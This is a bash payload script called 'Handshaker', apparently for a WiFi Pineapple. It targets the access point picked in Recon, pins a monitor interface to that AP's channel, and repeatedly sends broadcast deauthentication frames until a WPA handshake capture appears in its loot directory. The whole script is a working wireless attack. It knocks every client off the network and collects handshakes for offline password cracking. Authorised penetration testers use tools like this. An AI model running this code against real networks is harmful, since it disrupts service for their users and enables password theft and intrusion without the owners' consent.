#!/bin/bash
# Title: Handshaker
# Description: Force a handshake capture for the Recon-selected AP using wlan2mon when available, otherwise wlan1mon
# Version: 1.0
# Category: recon/access_point

HANDSHAKE_DIR="/root/loot/handshakes"
DEAUTH_BURST=8
RECHECK_WAIT_SEC=20
EXAMINE_STARTED=0

TARGET_SSID="${_RECON_SELECTED_AP_SSID:-}"
TARGET_BSSID="${_RECON_SELECTED_AP_BSSID:-}"
TARGET_CHANNEL="${_RECON_SELECTED_AP_CHANNEL:-}"
TARGET_FREQ="${_RECON_SELECTED_AP_FREQ:-}"

cleanup() {
    if [ "$EXAMINE_STARTED" = "1" ]; then
        LOG blue "Resuming channel hopping.."
        PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1 || true
        EXAMINE_STARTED=0
    fi
}
trap cleanup EXIT INT TERM

iface_available() {
    local iface="$1"
    [ -d "/sys/class/net/${iface}" ] && return 0
    iw dev "$iface" info >/dev/null 2>&1
}

select_monitor_iface() {
    if iface_available "wlan2mon"; then
        echo "wlan2mon"
        return 0
    fi
    if iface_available "wlan1mon"; then
        echo "wlan1mon"
        return 0
    fi
    return 1
}

looks_like_mac() {
    echo "$1" | grep -Eqi '^([0-9a-f]{2}:){5}[0-9a-f]{2}$'
}

clean_bssid() {
    printf "%s" "$1" | tr -d '[:space:]:-' | tr '[:lower:]' '[:upper:]'
}

find_handshake() {
    local mac_plain mac_lower hit
    mac_plain=$(clean_bssid "$TARGET_BSSID")
    [ -z "$mac_plain" ] && return 1
    mac_lower=$(printf "%s" "$mac_plain" | tr '[:upper:]' '[:lower:]')

    mkdir -p "$HANDSHAKE_DIR"

    hit=$(find "$HANDSHAKE_DIR" -type f \( \
        -iname "*${mac_plain}*.22000" -o \
        -iname "*${mac_lower}*.22000" \
    \) 2>/dev/null | head -n 1)
    if [ -n "$hit" ]; then
        printf "%s" "$hit"
        return 0
    fi

    hit=$(find "$HANDSHAKE_DIR" -type f \( \
        -iname "*${mac_plain}*handshake*.pcap" -o \
        -iname "*${mac_lower}*handshake*.pcap" -o \
        -iname "*${mac_plain}*.pcapng" -o \
        -iname "*${mac_lower}*.pcapng" \
    \) 2>/dev/null | head -n 1)
    if [ -n "$hit" ]; then
        printf "%s" "$hit"
        return 0
    fi

    return 1
}

deauth_target() {
    local i=0
    while [ "$i" -lt "$DEAUTH_BURST" ]; do
        if type PINEAPPLE_DEAUTH_CLIENT >/dev/null 2>&1; then
            PINEAPPLE_DEAUTH_CLIENT "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$TARGET_CHANNEL"
        else
            _pineap DEAUTH "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$TARGET_CHANNEL"
        fi
        i=$((i + 1))
        sleep 0.1
    done
}

lock_monitor_channel() {
    local iface="$1"
    iw dev "$iface" set channel "$TARGET_CHANNEL" >/dev/null 2>&1 && return 0
    if [ -n "$TARGET_FREQ" ]; then
        iw dev "$iface" set freq "$TARGET_FREQ" >/dev/null 2>&1 && return 0
    fi
    return 1
}

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    ERROR_DIALOG "No Recon AP selected" "Select an access point in Recon, then run Handshaker."
    LOG red "Missing Recon AP BSSID or channel. Exiting."
    exit 1
fi

if ! looks_like_mac "$TARGET_BSSID"; then
    ERROR_DIALOG "Invalid Recon BSSID" "Handshaker needs a valid AP MAC from Recon."
    LOG red "Invalid BSSID: $TARGET_BSSID"
    exit 1
fi

if [ -z "$TARGET_SSID" ] || [ "$TARGET_SSID" = "(hidden)" ]; then
    TARGET_SSID="(hidden)"
fi

MON_IFACE=$(select_monitor_iface) || {
    ERROR_DIALOG "No monitor interface" "wlan2mon and wlan1mon are both unavailable."
    LOG red "No monitor interface available."
    exit 1
}

LOG blue "Target SSID: $TARGET_SSID"
LOG blue "Target BSSID: $TARGET_BSSID"
LOG blue "Target channel: $TARGET_CHANNEL"
LOG green "Using monitor interface: $MON_IFACE"

HANDSHAKE=$(find_handshake || true)
if [ -n "$HANDSHAKE" ]; then
    LOG green "Handshake already present."
    ALERT "Handshake found\n\nSSID: $TARGET_SSID\nBSSID: $TARGET_BSSID\nFile: $HANDSHAKE"
    exit 0
fi

LOG blue "Locking radio to target.."
if lock_monitor_channel "$MON_IFACE"; then
    LOG green "$MON_IFACE set to channel $TARGET_CHANNEL"
else
    LOG yellow "Could not set $MON_IFACE channel; continuing with examine lock."
fi

PINEAPPLE_EXAMINE_BSSID "$TARGET_BSSID"
EXAMINE_STARTED=1
LOG green "Radio optimized for handshake capture."

ATTEMPT=1
while true; do
    LOG red "Handshake not found. Deauth burst $ATTEMPT on $TARGET_SSID"
    spinner=$(START_SPINNER "Deauthing $TARGET_SSID ($MON_IFACE)")
    deauth_target
    sleep "$RECHECK_WAIT_SEC"
    HANDSHAKE=$(find_handshake || true)
    STOP_SPINNER "${spinner}"

    if [ -n "$HANDSHAKE" ]; then
        break
    fi
    ATTEMPT=$((ATTEMPT + 1))
done

LOG green "Handshake found!"
LOG green "$HANDSHAKE"
ALERT "Handshake captured\n\nSSID: $TARGET_SSID\nBSSID: $TARGET_BSSID\nIface: $MON_IFACE\nFile: $HANDSHAKE"
exit 0
